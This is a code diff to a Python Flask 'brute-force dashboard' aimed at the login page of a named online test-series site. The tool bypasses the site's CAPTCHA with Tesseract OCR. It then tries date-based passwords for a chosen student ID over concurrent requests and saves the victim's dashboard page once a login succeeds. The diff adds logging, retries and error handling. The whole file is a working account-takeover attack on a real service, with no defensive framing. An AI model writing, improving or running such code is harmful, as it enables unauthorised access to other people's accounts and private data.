@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Motion OTS Brute‑Force Dashboard – Full Implementation
+Motion OTS Brute‑Force Dashboard – Full Implementation with Live Logging
 Author: Potato
 """
 
@@ -19,6 +19,7 @@ from datetime import datetime, timedelta
 from PIL import Image
 from io import BytesIO
 import sqlite3
+import traceback
 
 from flask import Flask, render_template_string, request, jsonify, g
 
@@ -32,17 +33,22 @@ except ImportError:
     print("⚠️  pytesseract not installed. Run: pip install pytesseract")
     sys.exit(1)
 
-def solve_captcha_image(img_bytes):
-    """Use Tesseract to read CAPTCHA text."""
-    img = Image.open(BytesIO(img_bytes))
-    img = img.convert('L')
-    img = img.point(lambda p: 0 if p < 140 else 255, '1')
-    custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-    text = pytesseract.image_to_string(img, config=custom_config)
-    cleaned = re.sub(r'[^A-Z0-9]', '', text).strip()
-    if len(cleaned) >= 4:
-        return cleaned[:6]
-    return None
+def solve_captcha_image(img_bytes, log_queue=None):
+    """Use Tesseract to read CAPTCHA text. Logs any errors."""
+    try:
+        img = Image.open(BytesIO(img_bytes))
+        img = img.convert('L')
+        img = img.point(lambda p: 0 if p < 140 else 255, '1')
+        custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+        text = pytesseract.image_to_string(img, config=custom_config)
+        cleaned = re.sub(r'[^A-Z0-9]', '', text).strip()
+        if len(cleaned) >= 4:
+            return cleaned[:6]
+        return None
+    except Exception as e:
+        if log_queue:
+            log_queue.put_nowait(f"❌ OCR error: {str(e)}")
+        return None
 
 # ---------- Database ----------
 DATABASE = 'brute_jobs.db'
@@ -137,7 +143,7 @@ class BruteJob:
         try:
             asyncio.run(self._async_bruteforce())
         except Exception as e:
-            self.log_queue.put(f"❌ Error: {e}")
+            self.log_queue.put(f"❌ Unhandled error: {traceback.format_exc()}")
         finally:
             self.status = 'success' if self.password else 'failed'
             self.end_time = datetime.now().isoformat()
@@ -154,9 +160,10 @@ class BruteJob:
         total = len(dates)
         log_queue.put_nowait(f"🚀 Starting brute‑force for {user_id} over {year} ({total} passwords)")
 
-        connector = aiohttp.TCPConnector(limit=50, limit_per_host=50)
+        # Lower concurrency to avoid memory issues
+        connector = aiohttp.TCPConnector(limit=10, limit_per_host=10)
         async with aiohttp.ClientSession(connector=connector) as session:
-            semaphore = asyncio.Semaphore(50)
+            semaphore = asyncio.Semaphore(10)
             result_queue = asyncio.Queue()
             stop_event = asyncio.Event()
 
@@ -187,12 +194,15 @@ class BruteJob:
                 self.password = found
                 log_queue.put_nowait(f"🎉 Password found: {found}")
                 if session_obj:
-                    dash = await session_obj.get("https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php")
-                    if dash.status == 200:
-                        html = await dash.text()
-                        with open(f"dashboard_{user_id}.html", "w") as f:
-                            f.write(html)
-                        log_queue.put_nowait("💾 Dashboard saved.")
+                    try:
+                        dash = await session_obj.get("https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php")
+                        if dash.status == 200:
+                            html = await dash.text()
+                            with open(f"dashboard_{user_id}.html", "w") as f:
+                                f.write(html)
+                            log_queue.put_nowait("💾 Dashboard saved.")
+                    except Exception as e:
+                        log_queue.put_nowait(f"⚠️ Failed to save dashboard: {e}")
             else:
                 log_queue.put_nowait("❌ No password found in that year.")
 
@@ -200,45 +210,69 @@ class BruteJob:
         if stop_event.is_set():
             return
         async with semaphore:
+            log_queue.put_nowait(f"⏳ Attempting {password}")
             try:
-                captcha = await self._fetch_captcha(session)
-            except Exception as e:
-                log_queue.put_nowait(f"⚠️ CAPTCHA error: {e}")
-                return
-            log_queue.put_nowait(f"🔑 Trying {password} with CAPTCHA {captcha}")
-            success, response = await self._try_login(session, user_id, password, captcha)
-            if success:
-                log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
-                result_queue.put_nowait((password, session))
-                stop_event.set()
-                return
-            if response == "captcha_error":
-                log_queue.put_nowait("🔄 CAPTCHA wrong, retrying...")
-                try:
-                    captcha2 = await self._fetch_captcha(session)
-                    success2, _ = await self._try_login(session, user_id, password, captcha2)
-                    if success2:
-                        log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
-                        result_queue.put_nowait((password, session))
-                        stop_event.set()
-                        return
-                except:
+                # Step 1: Fetch CAPTCHA
+                captcha = await self._fetch_captcha(session, log_queue)
+                if not captcha:
+                    log_queue.put_nowait(f"⏭️ Skipping {password} – CAPTCHA not obtained.")
+                    return
+                log_queue.put_nowait(f"🔑 Trying {password} with CAPTCHA {captcha}")
+
+                # Step 2: Login attempt
+                success, response = await self._try_login(session, user_id, password, captcha)
+                if success:
+                    log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
+                    result_queue.put_nowait((password, session))
+                    stop_event.set()
+                    return
+
+                # Handle CAPTCHA errors
+                if response == "captcha_error":
+                    log_queue.put_nowait("🔄 CAPTCHA wrong, retrying with new image...")
+                    try:
+                        captcha2 = await self._fetch_captcha(session, log_queue)
+                        if captcha2:
+                            success2, _ = await self._try_login(session, user_id, password, captcha2)
+                            if success2:
+                                log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
+                                result_queue.put_nowait((password, session))
+                                stop_event.set()
+                                return
+                    except Exception as e:
+                        log_queue.put_nowait(f"⚠️ Retry CAPTCHA error: {e}")
+                else:
+                    # Login failed for other reasons (wrong password)
+                    # We don't log every failure to avoid clutter, but we could if needed
                     pass
+
+            except Exception as e:
+                log_queue.put_nowait(f"❌ Worker error for {password}: {str(e)}\n{traceback.format_exc()}")
             await asyncio.sleep(0.05)
 
-    async def _fetch_captcha(self, session):
+    async def _fetch_captcha(self, session, log_queue):
         for attempt in range(3):
-            rand = int(time.time() * 1000) + attempt + os.getpid()
-            url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
-            async with session.get(url) as resp:
-                if resp.status == 200:
-                    img_bytes = await resp.read()
-                    loop = asyncio.get_running_loop()
-                    captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes)
-                    if captcha:
-                        return captcha
-            await asyncio.sleep(0.1)
-        raise Exception("CAPTCHA solve failed")
+            try:
+                rand = int(time.time() * 1000) + attempt + os.getpid()
+                url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
+                log_queue.put_nowait(f"📸 Fetching CAPTCHA (attempt {attempt+1})")
+                async with session.get(url) as resp:
+                    if resp.status == 200:
+                        img_bytes = await resp.read()
+                        loop = asyncio.get_running_loop()
+                        captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
+                        if captcha:
+                            log_queue.put_nowait(f"✅ CAPTCHA solved: {captcha}")
+                            return captcha
+                        else:
+                            log_queue.put_nowait("⚠️ OCR returned empty result")
+                    else:
+                        log_queue.put_nowait(f"⚠️ CAPTCHA HTTP {resp.status}")
+            except Exception as e:
+                log_queue.put_nowait(f"⚠️ CAPTCHA fetch error: {str(e)}")
+            await asyncio.sleep(0.2)
+        log_queue.put_nowait("❌ Failed to get CAPTCHA after 3 attempts")
+        return None
 
     async def _try_login(self, session, user_id, password, captcha):
         data = {
@@ -253,20 +287,23 @@ class BruteJob:
             "Accept-Language": "en-US,en;q=0.9",
             "Referer": "https://onlinetestseries.motion.ac.in/",
         }
-        async with session.post("https://onlinetestseries.motion.ac.in/login.php",
-                                data=data, headers=headers, allow_redirects=False) as resp:
-            if resp.status == 302:
-                location = resp.headers.get("Location", "")
-                if "dashboard/student-dashboard.php" in location:
-                    return True, None
-            if resp.status == 200:
-                text = await resp.text()
-                soup = BeautifulSoup(text, "html.parser")
-                err = soup.find("div", class_="alertmsg")
-                if err and ("CAPTCHA" in err.text or "captcha" in err.text):
-                    return False, "captcha_error"
-                return False, text
-            return False, f"HTTP {resp.status}"
+        try:
+            async with session.post("https://onlinetestseries.motion.ac.in/login.php",
+                                    data=data, headers=headers, allow_redirects=False) as resp:
+                if resp.status == 302:
+                    location = resp.headers.get("Location", "")
+                    if "dashboard/student-dashboard.php" in location:
+                        return True, None
+                if resp.status == 200:
+                    text = await resp.text()
+                    soup = BeautifulSoup(text, "html.parser")
+                    err = soup.find("div", class_="alertmsg")
+                    if err and ("CAPTCHA" in err.text or "captcha" in err.text):
+                        return False, "captcha_error"
+                    return False, text
+                return False, f"HTTP {resp.status}"
+        except Exception as e:
+            raise Exception(f"Login request failed: {str(e)}")
 
     def stop(self):
         self.stop_flag = True
@@ -600,6 +637,16 @@ def list_jobs():
                 'created_at': row['created_at']
             })
         return jsonify({'jobs': jobs_list})
+
+# ---------- Tesseract Test Route ----------
+@app.route('/test-tesseract')
+def test_tesseract():
+    import subprocess
+    try:
+        result = subprocess.run(['tesseract', '--version'], capture_output=True, text=True)
+        return f"✅ Tesseract OK: {result.stdout[:200]}"
+    except Exception as e:
+        return f"❌ Tesseract ERROR: {str(e)}"
 
 @app.teardown_appcontext
 def close_connection(exception):
